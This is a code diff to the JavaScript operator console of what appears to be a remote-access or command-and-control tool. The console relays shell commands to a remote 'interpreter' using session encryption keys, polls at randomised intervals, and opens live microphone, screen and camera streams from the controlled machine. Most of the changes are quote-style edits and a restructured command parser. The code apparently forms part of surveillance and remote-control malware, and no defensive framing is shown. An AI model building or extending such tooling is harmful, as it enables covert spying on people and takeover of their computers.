@@ -111,10 +111,10 @@
 	// Change fetch rate
 	const changeFetchRate = async (min, max) => {
 		$.ajax({
-			method: 'post',
-			url: '../../post',
-			data: 'body=' + session_config['fetch_rate_tag'] + ' ' + min + ' ' + max + '&session_id=' + session_id + '&encryption_key_one=' + session_config['encryption_key_one'] + '&relay_address=' + relay_config['relay_address'] + '&request_tag=' + relay_config['sewers_post_tag'],
-			mimeType: 'text/plain; charset=UTF-8',
+			method: "post",
+			url: "../../post",
+			data: "body=" + session_config["fetch_rate_tag"] + " " + min + " " + max + "&session_id=" + session_id + "&encryption_key_one=" + session_config["encryption_key_one"] + "&relay_address=" + relay_config["relay_address"] + "&request_tag=" + relay_config["sewers_post_tag"],
+			mimeType: "text/plain; charset=UTF-8",
 			success: () => {
 				print("<span>Interpreter will be fetching packets every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds next time it fetches packets<br></span>")
 				session_config["fetch_rate"] = min + "-" + max
@@ -134,7 +134,7 @@
 			let response = res.responseText
 
 			if (response.length > 0) {
-				let packets = response.split(',')
+				let packets = response.split(",")
 
 				for (i = 0; i < packets.length; i++) {
 					let packetID = packets[i]
@@ -163,7 +163,7 @@
 							type = "image/svg+xml"
 						}
 
-						await print(response_tag + ' <span class="bold lightgreen">OK</span> <span>' + time + '</span><br>')
+						await print(response_tag + " <span class=\"bold lightgreen\">OK</span> <span>" + time + "</span><br>")
 
 						if (type == "image/png") {
 							print("<img title=\"Response ID: " + packetID + "\" src=\"data:" + type + ";base64," + await escapeHTML(response) + "\" /><br>")
@@ -177,7 +177,7 @@
 
 							print(stdout)
 						} else {
-							print('<span title="Response ID: ' + packetID + '">' + await escapeHTML(plaintext) + '</span>')
+							print("<span title=\"Response ID: " + packetID + "\">" + await escapeHTML(plaintext) + "</span>")
 						}
 					}
 				}
@@ -305,11 +305,11 @@
 	// Append new stream to menu
 	const addStream = async (streamID, streamType) => {
 		if (streamType == "STREAMMIC") {
-			document.querySelector("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon streammic'><div class='icon rec blinking'></div></div></div>")
+			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".wav', 'width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammic\"><div class=\"icon rec blinking\"></div></div></div>")
 		} else if (streamType == "STREAMMON") {
-			document.querySelector("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon streammon'><div class='icon rec blinking'></div></div></div>")
+			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammon\"><div class=\"icon rec blinking\"></div></div></div>")
 		} else if (streamType == "STREAMCAM") {
-			document.querySelector("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon eye'><div class='icon rec blinking'></div></div></div>")
+			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon eye\"><div class=\"icon rec blinking\"></div></div></div>")
 		}
 	}
 
@@ -413,69 +413,71 @@
 		print(request_tag + "<span title='" + await timestamp() + "'>" + await escapeHTML(cmd) + "</span><br>")
 
 		// Parse command
-		if ( cmd.match(/^\s*\#/) ) {
-			return
-		} else if (cmd.split(" ")[0] == "startautofetching") {
-			if (cmd.split(" ")[3]) {
-				print("Too many arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if (!cmd.split(" ")[2]) {
-				print("Not enough arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
-				print("Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
-				print("Minimum value must be at least 1.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+		if (cmd.length > 0) {
+			if ( cmd.match(/^\s*\#/) ) {
+				return
+			} else if (cmd.split(" ")[0] == "startautofetching") {
+				if (cmd.split(" ")[3]) {
+					print("Too many arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if (!cmd.split(" ")[2]) {
+					print("Not enough arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
+					print("Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
+					print("Minimum value must be at least 1.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else {
+					min = parseInt( cmd.split(" ")[1] )
+					max = parseInt( cmd.split(" ")[2] )
+					startAutoFetching(min, max)
+				}
+			} else if (cmd == "clear") {
+				clear()
+			} else if (cmd == "exit") {
+				self.close() || alert("You can only use this in pop-up mode.")
+			} else if (cmd.toLowerCase() == "?" || cmd.toLowerCase() == "help" || cmd.toLowerCase() == "h" || cmd.toLowerCase() == "commands" || cmd.toLowerCase() == "usage") {
+				printCommands()
+			} else if (cmd.toLowerCase() == "checkstreams") {
+				checkStreams()
+			} else if (cmd == "reset") {
+				if (warnOnReset) {
+					self.location = location.href
+				}	else {
+					document.body.innerHTML = ""
+					window.onbeforeunload = ""
+					self.location = location.href
+				}
+			} else if (cmd == "stopautofetching") {
+				stopAutoFetching()
+			} else if (cmd.split(" ")[0].toLowerCase() == "streammon") {
+				streamMon(cmd.split(" ")[1], cmd.split(" ")[2])
+			} else if (cmd.split(" ")[0].toLowerCase() == "streammic") {
+				streamMic(cmd.split(" ")[1])
+			} else if (cmd.split(" ")[0].toLowerCase() == "info") {
+				printSessionInfo()
+			} else if (cmd == "fetch") {
+				fetchPackets()
+			} else if (cmd.split(" ")[0].toLowerCase() == "fetchrate") {
+				if (cmd.split(" ")[3]) {
+					print("Too many arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if (!cmd.split(" ")[2]) {
+					print("Not enough arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
+					print("Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
+					print("Minimum value must be at least 1.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
+				} else {
+					min = parseInt( cmd.split(" ")[1] )
+					max = parseInt( cmd.split(" ")[2] )
+					changeFetchRate(min, max)
+				}
+			} else if (cmd.split(" ")[0].toLowerCase() == "shell" || cmd.split(" ")[0].toLowerCase() == "sh") {
+				cmd = cmd.split(" ")
+				cmd.splice(cmd[0], 1)
+				cmd = cmd.join(" ")
+				stdIn( await strip(cmd) )
 			} else {
-				min = parseInt( cmd.split(" ")[1] )
-				max = parseInt( cmd.split(" ")[2] )
-				startAutoFetching(min, max)
+				print( await escapeHTML(cmd) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" )
 			}
-		} else if (cmd == "clear") {
-			clear()
-		} else if (cmd == "exit") {
-			self.close() || alert("You can only use this in pop-up mode.")
-		} else if (cmd.toLowerCase() == "?" || cmd.toLowerCase() == "help" || cmd.toLowerCase() == "h" || cmd.toLowerCase() == "commands" || cmd.toLowerCase() == "usage") {
-			printCommands()
-		} else if (cmd.toLowerCase() == "checkstreams") {
-			checkStreams()
-		} else if (cmd == "reset") {
-			if (warnOnReset) {
-				self.location = location.href
-			}	else {
-				$("body").html("")
-				window.onbeforeunload = ""
-				self.location = location.href
-			}
-		} else if (cmd == "stopautofetching") {
-			stopAutoFetching()
-		} else if (cmd.split(" ")[0].toLowerCase() == "streammon") {
-			streamMon(cmd.split(" ")[1], cmd.split(" ")[2])
-		} else if (cmd.split(" ")[0].toLowerCase() == "streammic") {
-			streamMic(cmd.split(" ")[1])
-		} else if (cmd.split(" ")[0].toLowerCase() == "info") {
-			printSessionInfo()
-		} else if (cmd == "fetch") {
-			fetchPackets()
-		} else if (cmd.split(" ")[0].toLowerCase() == "fetchrate") {
-			if (cmd.split(" ")[3]) {
-				print("Too many arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if (!cmd.split(" ")[2]) {
-				print("Not enough arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
-				print("Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
-				print("Minimum value must be at least 1.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>")
-			} else {
-				min = parseInt( cmd.split(" ")[1] )
-				max = parseInt( cmd.split(" ")[2] )
-				changeFetchRate(min, max)
-			}
-		} else if (cmd.split(" ")[0].toLowerCase() == "shell" || cmd.split(" ")[0].toLowerCase() == "sh") {
-			cmd = cmd.split(' ')
-			cmd.splice(cmd[0], 1)
-			cmd = cmd.join(' ')
-			stdIn( await strip(cmd) )
-		} else if (cmd.length > 0) {
-			print( escapeHTML(cmd) + ': command not found. Type <span class="bold orange">help</span> to see a list of commands.<br>' )
 		}
 
 		textarea.focus()
